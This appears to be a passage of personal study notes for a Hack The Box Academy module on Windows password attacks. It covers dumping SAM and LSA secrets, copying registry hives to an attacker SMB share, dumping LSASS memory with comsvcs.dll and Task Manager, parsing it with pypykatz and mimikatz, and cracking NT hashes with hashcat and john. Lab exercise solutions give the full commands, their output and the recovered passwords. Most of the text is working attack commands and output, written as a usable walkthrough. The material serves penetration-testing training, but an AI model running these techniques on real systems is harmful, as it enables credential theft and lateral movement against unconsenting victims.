        1 file(s) moved.
```

We can then confirm that our hive copies were successfully moved to the share by navigating to the shared directory on our attack host and using `ls` to list the files.

### Dumping hashes with secretsdump

One particularly useful tool for dumping hashes offline is Impacket's `secretsdump`. Impacket is included in most modern penetration testing distributions. To check if it is installed on a Linux based system, we can use the `locate` command: `locate secretsdump`

Using `secretsdump` is straightforward. We simply run the script with Python and specify each of the hive files we retrieved from the target host.

```bash
mdn0x@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

Here we see that `secretsdump` successfully dumped the `local` SAM hashes, along with data from `hklm\security`, including cached domain logon information and LSA secrets such as the machine and user keys for DPAPI.

Notice that the first step `secretsdump` performs is retrieving the `system bootkey` before proceeding to dump the `local SAM hashes`. This is necessary because the bootkey is used to encrypt and decrypt the SAM database. Without it, the hashes cannot be decrypted — which is why having copies of the relevant registry hives, as discussed earlier, is crucial.

Moving on, notice the following line: Dumping local SAM hashes (uid:rid:lmhash:nthash)

This tells us how to interpret the output and which hashes we can attempt to crack. Most modern Windows operating systems store passwords as `NT hashes`. Older systems (such as those prior to Windows Vista and Windows Server 2008) may store passwords as `LM hashes`, which are weaker and easier to crack. Therefore, LM hashes are useful if the target is running an older version of Windows.

With this in mind, we can copy the NT hashes associated with each user account into a text file and begin cracking passwords. It is helpful to note which hash corresponds to which user to keep track of the results.
### Cracking hashes with Hashcat

Once we have the hashes, we can begin cracking them using [Hashcat](https://hashcat.net/hashcat/). Hashcat supports a wide range of hashing algorithms, as outlined on its website. In this module, we will focus on using Hashcat for specific use cases. This approach will help build your understanding of how and when to use Hashcat effectively, and how to refer to its documentation to identify the appropriate mode and options based on the type of hashes you've captured.

As mentioned earlier, we can populate a text file with the NT hashes we were able to dump.
Now that the NT hashes are in our text file (`hashestocrack.txt`), we can use Hashcat to crack them.

Hashcat supports many different modes, and selecting the right one depends largely on the type of attack and the specific hash type we want to crack. Covering all available modes is beyond the scope of this module, so we will focus on using the `-m` option to specify hash type `1000`, which corresponds to NT hashes (also known as NTLM-based hashes). For a full list of supported hash types and their associated mode numbers, we can refer to Hashcat's [wiki page](https://hashcat.net/wiki/doku.php?id=example_hashes) or consult the man page.

```bash
mdn0x@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

We can see from the output that Hashcat was successful in cracking three of the hashes. Having these passwords can be useful in many ways. For example, we could attempt to use the cracked credentials to access other systems on the network. It is very common for users to reuse passwords across different work and personal accounts. Understanding and applying this technique can be valuable during assessments. We will benefit from it anytime we encounter a vulnerable Windows system and gain administrative rights to dump the SAM database.

Keep in mind that this is a well-known technique, and administrators may have implemented safeguards to detect or prevent it. Several detection and mitigation strategies are [documented](https://attack.mitre.org/techniques/T1003/002/) within the MITRE ATT&CK framework.
### DCC2 hashes

As mentioned previously, `hklm\security` contains cached domain logon information, specifically in the form of DCC2 hashes. These are local, hashed copies of network credential hashes. An example is:

```
inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
```

This type of hash is much more difficult to crack than an NT hash, as it uses PBKDF2. Additionally, it cannot be used for lateral movement with techniques like Pass-the-Hash (which we will cover later). The Hashcat mode for cracking DCC2 hashes is `2100`.

```bash
mdn0x@htb[/htb]$ hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
```

Note the cracking speed of `5536 H/s`. On the same machine, NTLM hashes can be cracked at `4605.4 kH/s`. This means that cracking DCC2 hashes is approximately `800 times slower`. The exact numbers will depend heavily on the hardware available, of course, but the takeaway is that strong passwords are often uncrackable within typical penetration testing timeframes.
### DPAPI

In addition to the DCC2 hashes, we previously saw that the `machine and user keys` for `DPAPI` were also dumped from `hklm\security`. The Data Protection Application Programming Interface, or [DPAPI](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection), is a set of APIs in Windows operating systems used to encrypt and decrypt data blobs on a per-user basis. These blobs are utilized by various Windows OS features and third-party applications. Below are just a few examples of applications that use DPAPI and how they use it:

|Applications|Use of DPAPI|
|---|---|
|`Internet Explorer`|Password form auto-completion data (username and password for saved sites).|
|`Google Chrome`|Password form auto-completion data (username and password for saved sites).|
|`Outlook`|Passwords for email accounts.|
|`Remote Desktop Connection`|Saved credentials for connections to remote machines.|
|`Credential Manager`|Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more.|

DPAPI encrypted credentials can be decrypted manually with tools like Impacket's [dpapi](https://github.com/fortra/impacket/blob/master/examples/dpapi.py), [mimikatz](https://github.com/gentilkiwi/mimikatz), or remotely with [DonPAPI](https://github.com/login-securite/DonPAPI).

```
C:\Users\Public> mimikatz.exe
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
> Encrypted Key found in local state file
> Encrypted Key seems to be protected by DPAPI
 * using CryptUnprotectData API
> AES Key is: efefdb353f36e6a9b7a7552cc421393daf867ac28d544e4f6f157e0a698e343c

URL     : http://10.10.14.94/ ( http://10.10.14.94/login.html )
Username: bob
 * using BCrypt with AES-256-GCM
Password: April2025!
```
### Remote dumping & LSA secrets considerations

With access to credentials that have `local administrator privileges`, it is also possible to target LSA secrets over the network. This may allow us to extract credentials from running services, scheduled tasks, or applications that store passwords using LSA secrets.

```bash
mdn0x@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

Similarly, we can use netexec to dump hashes from the SAM database remotely.

```bash
mdn0x@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

Practice the techniques taught in this section while you work to complete the challenge questions.
### Exercise

[[RDP]] to with user `Bob` and password   `HTB_@cademy_stdnt!`

1. Where is the SAM database located in the Windows registry?         `HKLM\SAM`

2. Apply the concepts taught in this section to obtain the password to the `ITbackdoor` user account on the target. Submit the clear-text password as the answer.

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ xfreerdp3 /u:Bob /p:HTB_@cademy_stdnt! /v:target.htb


PS C:\Windows\system32> reg.exe save hklm\sam C:\sam.save
The operation completed successfully.
PS C:\Windows\system32> reg.exe save hklm\system C:\system.save
The operation completed successfully.
PS C:\Windows\system32> reg.exe save hklm\security C:\security.save
The operation completed successfully.
```

Open [[SMB]] share:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ smbserver.py -smb2support CompData /home/mdn0x/HTB/Academy/passwd_attacks 

```

Transfer:

```powershell
move sam.save \\10.10.15.108\CompData
move security.save \\10.10.15.108\CompData
move system.save \\10.10.15.108\CompData
```

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xd33955748b2d17d7b09c9cb2653dd0e8
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
jason:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
frontdesk:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
[*] NL$KM 
 0000   E4 FE 18 4B 25 46 81 18  BF 23 F5 A3 2A E8 36 97   ...K%F...#..*.6.
 0010   6B A4 92 B3 A4 32 DE B3  91 17 46 B8 EC 63 C4 51   k....2....F..c.Q
 0020   A7 0C 18 26 E9 14 5A A2  F3 42 1B 98 ED 0C BD 9A   ...&..Z..B......
 0030   0C 1A 1B EF AC B3 76 C5  90 FA 7B 56 CA 1B 48 8B   ......v...{V..H.
NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
[*] _SC_gupdate 
(Unknown User):Password123
[*] Cleaning up... 


┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ john --format=NT hash       
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=12
Note: Passwords longer than 27 rejected
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Warning: Only 23 candidates buffered for the current salt, minimum 24 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
0g 0:00:00:00 DONE 1/3 (2026-11-17 09:57) 0g/s 16022p/s 16022c/s 16022C/s Itbackdoor1905..Itbackdoor1900
Proceeding with wordlist:/usr/share/john/password.lst
Enabling duplicate candidate password suppressor using 256 MiB
matrix           (ITbackdoor)     
1g 0:00:00:00 DONE 2/3 (2026-11-17 09:57) 7.692g/s 14046p/s 14046c/s 14046C/s lacrosse..larry
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed
```


3. Dump the LSA secrets on the target and discover the credentials stored. Submit the username and password as the answer. (Format: username:password, Case-Sensitive)

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ netexec smb target.htb --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
SMB         10.129.202.137  445    FRONTDESK01      [*] Windows 10 / Server 2019 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:True) (SMBv1:None)
SMB         10.129.202.137  445    FRONTDESK01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB         10.129.202.137  445    FRONTDESK01      [*] Dumping LSA secrets
SMB         10.129.202.137  445    FRONTDESK01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce      
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a                                                             
SMB         10.129.202.137  445    FRONTDESK01      frontdesk:Password123                                            
SMB         10.129.202.137  445    FRONTDESK01      [+] Dumped 2 LSA secrets to /home/mdn0x/.nxc/logs/lsa/FRONTDESK01_10.129.202.137_2026-11-17_095915.secrets and /home/mdn0x/.nxc/logs/lsa/FRONTDESK01_10.129.202.137_2026-11-17_095915.cached  
```

`frontdesk:Password123`
## Attacking LSASS

In addition to acquiring copies of the SAM database to extract and crack password hashes, we will also benefit from targeting the [Local Security Authority Subsystem Service (LSASS)](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service). As covered in the `Credential Storage` section of this module, LSASS is a core Windows process responsible for enforcing security policies, handling user authentication, and storing sensitive credential material in memory.

Upon initial logon, LSASS will:

- Cache credentials locally in memory
- Create [access tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
- Enforce security policies
- Write to Windows' [security log](https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security)

Let's cover some of the techniques and tools we can use to dump LSASS memory and extract credentials from a target running Windows.
### Dumping LSASS process memory

Similar to the process of attacking the SAM database, it would be wise for us first to create a copy of the contents of LSASS process memory via the generation of a memory dump. Creating a dump file lets us extract credentials offline using our attack host. Keep in mind conducting attacks offline gives us more flexibility in the speed of our attack and requires less time spent on the target system. There are countless methods we can use to create a memory dump, so let's cover techniques that can be performed using tools already built into Windows.

**Task Manager method**

With access to an interactive graphical session on the target, we can use task manager to create a memory dump. This requires us to:

1. Open `Task Manager`
2. Select the `Processes` tab
3. Find and right click the `Local Security Authority Process`
4. Select `Create dump file`

A file called `lsass.DMP` is created and saved in `%temp%`. This is the file we will transfer to our attack host. We can use the file transfer method discussed in the previous section of this module to transfer the dump file to our attack host.

### Rundll32.exe & Comsvcs.dll method

The Task Manager method is dependent on us having a GUI-based interactive session with a target. We can use an alternative method to dump LSASS process memory through a command-line utility called [rundll32.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32). This way is faster than the Task Manager method and more flexible because we may gain a shell session on a Windows host with only access to the command line. It is important to note that modern anti-virus tools recognize this method as malicious activity.

Before issuing the command to create the dump file, we must determine what process ID (`PID`) is assigned to `lsass.exe`. This can be done from cmd or PowerShell:

**Finding LSASS's PID in cmd**
From cmd, we can issue the command `tasklist /svc` to find `lsass.exe` and its process ID.

**Finding LSASS's PID in powershell**
From PowerShell, we can issue the command `Get-Process lsass` and see the process ID in the `Id` field.

Once we have the PID assigned to the LSASS process, we can create a dump file.
### Creating a dump file using PowerShell

With an elevated PowerShell session, we can issue the following command to create a dump file:

```powershell
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

With this command, we are running `rundll32.exe` to call an exported function of `comsvcs.dll` which also calls the MiniDumpWriteDump (`MiniDump`) function to dump the LSASS process memory to a specified directory (`C:\lsass.dmp`). Recall that most modern AV tools recognize this as malicious activity and prevent the command from executing. In these cases, we will need to consider ways to bypass or disable the AV tool we are facing. AV bypassing techniques are outside of the scope of this module.

If we manage to run this command and generate the `lsass.dmp` file, we can proceed to transfer the file onto our attack box to attempt to extract any credentials that may have been stored in LSASS process memory.
### Using Pypykatz to extract credentials

Once we have the dump file on our attack host, we can use a powerful tool called [pypykatz](https://github.com/skelsec/pypykatz) to extract credentials from the `.dmp` file. Pypykatz is an implementation of Mimikatz written entirely in Python. The fact that it is written in Python allows us to run it on Linux-based attack hosts. At the time of writing, Mimikatz only runs on Windows systems, so to use it, we would either need to use a Windows attack host or we would need to run Mimikatz directly on the target, which is not an ideal scenario. This makes Pypykatz an appealing alternative because all we need is a copy of the dump file, and we can run it offline from our Linux-based attack host.

Recall that LSASS stores credentials that have active logon sessions on Windows systems. When we dumped LSASS process memory into the file, we essentially took a "snapshot" of what was in memory at that point in time. If there were any active logon sessions, the credentials used to establish them will be present. Let's run Pypykatz against the dump file and find out.

The command initiates the use of `pypykatz` to parse the secrets hidden in the LSASS process memory dump. We use `lsa` in the command because LSASS is a subsystem of the `Local Security Authority`, then we specify the data source as a `minidump` file, proceeded by the path to the dump file stored on our attack host. Pypykatz parses the dump file and outputs the findings:

```
mdn0x@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
```

[MSV](https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package) is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. Pypykatz extracted the `SID`, `Username`, `Domain`, and even the `NT` & `SHA1` password hashes associated with the bob user account's logon session stored in LSASS process memory. This will prove helpful in the next step of our attack covered at the end of this section.

`WDIGEST` is an older authentication protocol enabled by default in `Windows XP` - `Windows 8` and `Windows Server 2003` - `Windows Server 2012`. LSASS caches credentials used by WDIGEST in clear-text. This means if we find ourselves targeting a Windows system with WDIGEST enabled, we will most likely see a password in clear-text. Modern Windows operating systems have WDIGEST disabled by default. Additionally, it is essential to note that Microsoft released a security update for systems affected by this issue with WDIGEST. We can study the details of that security update [here](https://msrc-blog.microsoft.com/2014/06/05/an-overview-of-kb2871997/).

[Kerberos](https://web.mit.edu/kerberos/#what_is) is a network authentication protocol used by Active Directory in Windows Domain environments. Domain user accounts are granted tickets upon authentication with Active Directory. This ticket is used to allow the user to access shared resources on the network that they have been granted access to without needing to type their credentials each time. LSASS caches `passwords`, `ekeys`, `tickets`, and `pins` associated with Kerberos. It is possible to extract these from LSASS process memory and use them to access other systems joined to the same domain.

Mimikatz and Pypykatz can extract the DPAPI `masterkey` for logged-on users whose data is present in LSASS process memory. These masterkeys can then be used to decrypt the secrets associated with each of the applications using DPAPI and result in the capturing of credentials for various accounts. DPAPI attack techniques are covered in greater detail in the [Windows Privilege Escalation](https://academy.hackthebox.com/module/details/67) module.

We can use Hashcat to crack the NT Hash. In this example, we only found one NT hash associated with the Bob user. After setting the mode in the command, we can paste the hash, specify a wordlist, and then crack the hash.

```
mdn0x@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

### Exercise

1. What is the name of the executable file associated with the Local Security Authority Process?         `lsass.exe`

2. Apply the concepts taught in this section to obtain the password to the Vendor user account on the target. Submit the clear-text password as the answer. (Format: Case sensitive)

RDP to with user "htb-student" and password "HTB_@cademy_stdnt!"

We can dump from `Task Manager` and transfer the file:   

```bash
└─$ smbserver.py -smb2support LSASS /home/mdn0x/HTB/Academy/passwd_attacks

PS C:\Users\htb-student\AppData\Local\Temp> move lsass.DMP \\10.10.15.108\LSASS
```

```bash
└─$ pypykatz lsa minidump lsass.DMP
INFO:pypykatz:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 279808 (44500)
session_id 2
username htb-student
domainname FS01
logon_server FS01
logon_time 2026-11-17T09:13:42.373104+00:00
sid S-1-5-21-2288469977-2371064354-2971934342-1006
luid 279808
        == MSV ==
                Username: htb-student
                Domain: FS01
                LM: NA
                NT: 3c0e5d303ec84884ad5c3b7876a06ea6
                SHA1: b2978f9abc2f356e45cb66ec39510b1ccca08a0e
                DPAPI: 0000000000000000000000000000000000000000
        == WDIGEST [44500]==
                username htb-student
                domainname FS01
                password None
                password (hex)
        == Kerberos ==
                Username: htb-student
                Domain: FS01
        == WDIGEST [44500]==
                username htb-student
                domainname FS01
                password None
                password (hex)

== LogonSession ==
authentication_id 255202 (3e4e2)
session_id 0
username htb-student
domainname FS01
logon_server FS01
logon_time 2026-11-17T09:13:35.982573+00:00
sid S-1-5-21-2288469977-2371064354-2971934342-1006
luid 255202

== LogonSession ==
authentication_id 126355 (1ed93)
session_id 0
username Vendor
domainname FS01
logon_server FS01
logon_time 2026-11-17T09:11:51.998081+00:00
sid S-1-5-21-2288469977-2371064354-2971934342-1003
luid 126355
        == MSV ==
                Username: Vendor
                Domain: FS01
                LM: NA
                NT: 31f87811133bc6aaa75a536e77f64314
                SHA1: 2b1c560c35923a8936263770a047764d0422caba
                DPAPI: 0000000000000000000000000000000000000000
        == WDIGEST [1ed93]==
                username Vendor
                domainname FS01
                password None
                password (hex)
        == Kerberos ==
                Username: Vendor
                Domain: FS01
        == WDIGEST [1ed93]==
                username Vendor
                domainname FS01
                password None
                password (hex)

== LogonSession ==
authentication_id 73155 (11dc3)
session_id 1
username DWM-1
domainname Window Manager
logon_server 
logon_time 2026-11-17T09:11:51.123092+00:00
sid S-1-5-90-0-1
luid 73155
        == WDIGEST [11dc3]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)
        == WDIGEST [11dc3]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)

== LogonSession ==
authentication_id 42954 (a7ca)
session_id 0
username UMFD-0
domainname Font Driver Host
logon_server 
logon_time 2026-11-17T09:11:50.810677+00:00
sid S-1-5-96-0-0
luid 42954
        == WDIGEST [a7ca]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)
        == WDIGEST [a7ca]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)

== LogonSession ==
authentication_id 41830 (a366)
session_id 0
username 
domainname 
logon_server 
logon_time 2026-11-17T09:11:50.638734+00:00
sid None
luid 41830

== LogonSession ==
authentication_id 279837 (4451d)
session_id 2
username htb-student
domainname FS01
logon_server FS01
logon_time 2026-11-17T09:13:42.373104+00:00
sid S-1-5-21-2288469977-2371064354-2971934342-1006
luid 279837
        == MSV ==
                Username: htb-student
                Domain: FS01
                LM: NA
                NT: 3c0e5d303ec84884ad5c3b7876a06ea6
                SHA1: b2978f9abc2f356e45cb66ec39510b1ccca08a0e
                DPAPI: 0000000000000000000000000000000000000000
        == WDIGEST [4451d]==
                username htb-student
                domainname FS01
                password None
                password (hex)
        == Kerberos ==
                Username: htb-student
                Domain: FS01
        == WDIGEST [4451d]==
                username htb-student
                domainname FS01
                password None
                password (hex)
        == DPAPI [4451d]==
                luid 279837
                key_guid c75b5a96-7d80-4511-8bb8-474e3c09670f
                masterkey 12e8cc72d4d672d492fc8878c736aea970e11d74e87061fe779ce8884c9f0cb20cd0db541f95440ed8c4d527a91682fb7721ba397700932a49c8dbb7120cd2c8
                sha1_masterkey a34f57ba87672c43f091934906052ac4cf7364f7

== LogonSession ==
authentication_id 257641 (3ee69)
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server 
logon_time 2026-11-17T09:13:41.560587+00:00
sid S-1-5-96-0-2
luid 257641
        == WDIGEST [3ee69]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)
        == WDIGEST [3ee69]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)

== LogonSession ==
authentication_id 999 (3e7)
session_id 0
username FS01$
domainname WORKGROUP
logon_server 
logon_time 2026-11-17T09:11:50.576316+00:00
sid S-1-5-18
luid 999
        == WDIGEST [3e7]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)
        == Kerberos ==
                Username: fs01$
                Domain: WORKGROUP
        == WDIGEST [3e7]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)
        == DPAPI [3e7]==
                luid 999
                key_guid 7a4c5806-cde2-4e33-bb8e-a7988d928856
                masterkey 3036713f3ccfde362f57050b050289413347b9063264743b01c65e4143c6806512ece05c708b934afe48cd5b8cfe88de125d6208bbe048bd3fb83838adf2946e
                sha1_masterkey 6c3046d0bc927cdfd9b4503c6115034018dbddd1
        == DPAPI [3e7]==
                luid 999
                key_guid 0e36ca87-89cb-4629-98b3-f520bf344d93
                masterkey f8bcc5256931df80b788999045849d4ecbfba7374765078391041b80739c12f24ae22c236cde7a029734201ebc9bd7745ed8d4e37a4db2c41b8203ad097ea12f
                sha1_masterkey 94fcd8f99801bfc34bfc1a76e550fa83a31801ba
        == DPAPI [3e7]==
                luid 999
                key_guid 0c1b6c0a-191d-4839-8cf5-22ca4c3e5880
                masterkey dccd4056a5b0cc8211193669e6aea7755eeccd393adf0e5efa1f2a571c96039a7dbe05c9082c44f85b3080bb908eb41fb9f860174cd365e655f3d5788d5a8427
                sha1_masterkey efddd94b4348303e90c8d7285e8b65738196dc86
        == DPAPI [3e7]==
                luid 999
                key_guid 0453985c-7220-49f4-b024-79acf0de7874
                masterkey aaf3cdd36cf0d10871efd0d78a527664afc58078e84d49734f372fbb09e209538f606e0c5f0481b9f4d6ac6efb9a3631f16e38737a1b3cc15d0db42b63ebc90e
                sha1_masterkey 1d77f450edb6c76d14838b5b351672f35eec615f
        == DPAPI [3e7]==
                luid 999
                key_guid c19ecbf1-ea92-487e-a2d4-419f60a62360
                masterkey 387a060baf6887038b7ff133cd0eb4712ecdf531c16030a82395db368e6b2cda563dd026ccb815e1fb85215281a5437f085e3a5ca47fe9038e7e072f46270d74
                sha1_masterkey 5b07ca8e21e100937af4ab6d3f2482c745245436
        == DPAPI [3e7]==
                luid 999
                key_guid 6c61536b-7453-4ffa-911b-693858aef0c9
                masterkey 0c5f662bf8f65c75b773e4698606db1e2e387ad18a9c4fdee25e0dbac6eb7c04e04874d1910aba465ef3380a92b46231d7a781df2f5e38d2621e06c7476b222f
                sha1_masterkey cbabadd23d93b47ec94ac604ac91945135c5a097

== LogonSession ==
authentication_id 259005 (3f3bd)
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2026-11-17T09:13:41.591835+00:00
sid S-1-5-90-0-2
luid 259005
        == WDIGEST [3f3bd]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)
        == WDIGEST [3f3bd]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)

== LogonSession ==
authentication_id 258977 (3f3a1)
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2026-11-17T09:13:41.591835+00:00
sid S-1-5-90-0-2
luid 258977
        == WDIGEST [3f3a1]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)
        == WDIGEST [3f3a1]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)

== LogonSession ==
authentication_id 996 (3e4)
session_id 0
username FS01$
domainname WORKGROUP
logon_server 
logon_time 2026-11-17T09:11:50.919959+00:00
sid S-1-5-20
luid 996
        == WDIGEST [3e4]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)
        == Kerberos ==
                Username: fs01$
                Domain: WORKGROUP
        == WDIGEST [3e4]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)

== LogonSession ==
authentication_id 42984 (a7e8)
session_id 1
username UMFD-1
domainname Font Driver Host
logon_server 
logon_time 2026-11-17T09:11:50.810677+00:00
sid S-1-5-96-0-1
luid 42984
        == WDIGEST [a7e8]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)
        == WDIGEST [a7e8]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)

== LogonSession ==
authentication_id 997 (3e5)
session_id 0
username LOCAL SERVICE
domainname NT AUTHORITY
logon_server 
logon_time 2026-11-17T09:11:51.185591+00:00
sid S-1-5-19
luid 997
        == Kerberos ==
                Username: 
                Domain: 

== LogonSession ==
authentication_id 73174 (11dd6)
session_id 1
username DWM-1
domainname Window Manager
logon_server 
logon_time 2026-11-17T09:11:51.138707+00:00
sid S-1-5-90-0-1
luid 73174
        == WDIGEST [11dd6]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)
        == WDIGEST [11dd6]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ sudo hashcat -m 1000 31f87811133bc6aaa75a536e77f64314 /usr/share/wordlists/rockyou.txt 

31f87811133bc6aaa75a536e77f64314:Mic@123
```
## Attacking Windows Credential Manager

[Credential Manager](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication#windows-vault-and-credential-manager) is a feature built into Windows since `Server 2008 R2` and `Windows 7`. Thorough documentation on how it works is not publicly available, but essentially, it allows users and applications to securely store credentials relevant to other systems and websites. Credentials are stored in special encrypted folders on the computer under the user and system profiles ([MITRE ATT&CK](https://attack.mitre.org/techniques/T1555/004/)):

- `%UserProfile%\AppData\Local\Microsoft\Vault\`
- `%UserProfile%\AppData\Local\Microsoft\Credentials\`
- `%UserProfile%\AppData\Roaming\Microsoft\Vault\`
- `%ProgramData%\Microsoft\Vault\`
- `%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\`

Each vault folder contains a `Policy.vpol` file with AES keys (AES-128 or AES-256) that is protected by DPAPI. These AES keys are used to encrypt the credentials. Newer versions of Windows make use of `Credential Guard` to further protect the DPAPI master keys by storing them in secured memory enclaves ([Virtualization-based Security](https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs)).

Microsoft often refers to the protected stores as `Credential Lockers` (formerly `Windows Vaults`). Credential Manager is the user-facing feature/API, while the actual encrypted stores are the vault/locker folders. The following table lists the two types of credentials Windows stores:

| Name                | Description                                                                                                                                                           |
| ------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Web Credentials     | Credentials associated with websites and online accounts. This locker is used by Internet Explorer and legacy versions of Microsoft Edge.                             |
| Windows Credentials | Used to store login tokens for various services such as OneDrive, and credentials related to domain users, local network resources, services, and shared directories. |
It is possible to export Windows Vaults to `.crd` files either via Control Panel or with the following command. Backups created this way are encrypted with a password supplied by the user, and can be imported on other Windows systems.

```powershell
rundll32 keymgr.dll,KRShowKeyMgr
```
### Enumerating credentials with cmdkey

We can use [cmdkey](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) to enumerate the credentials stored in the current user's profile:

```powershell
cmdkey /list
```

Stored credentials are listed with the following format:

|Key|Value|
|---|---|
|Target|The resource or account name the credential is for. This could be a computer, domain name, or a special identifier.|
|Type|The kind of credential. Common types are `Generic` for general credentials, and `Domain Password` for domain user logons.|
|User|The user account associated with the credential.|
|Persistence|Some credentials indicate whether a credential is saved persistently on the computer; credentials marked with `Local machine persistence` survive reboots.|

The first credential in the command output above, `virtualapp/didlogical`, is a generic credential used by Microsoft account/Windows Live services. The random looking username is an internal account ID. This entry may be ignored for our purposes.

The second credential, `Domain:interactive=SRV01\mcharles`, is a domain credential associated with the user SRV01\mcharles. `Interactive` means that the credential is used for interactive logon sessions. Whenever we come across this type of credential, we can use `runas` to impersonate the stored user like so:

```
C:\Users\sadams>runas /savecred /user:SRV01\mcharles cmd
```

### Extracting credentials with Mimikatz

There are many different tools that can be used to decrypt stored credentials. One of the tools we can use is [mimikatz](https://github.com/gentilkiwi/mimikatz). Even within `mimikatz`, there are multiple ways to attack these credentials - we can either dump credentials from memory using the `sekurlsa` module, or we can manually decrypt credentials using the `dpapi` module. For this example, we will target the LSASS process with `sekurlsa`:

```
C:\Users\Administrator\Desktop> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
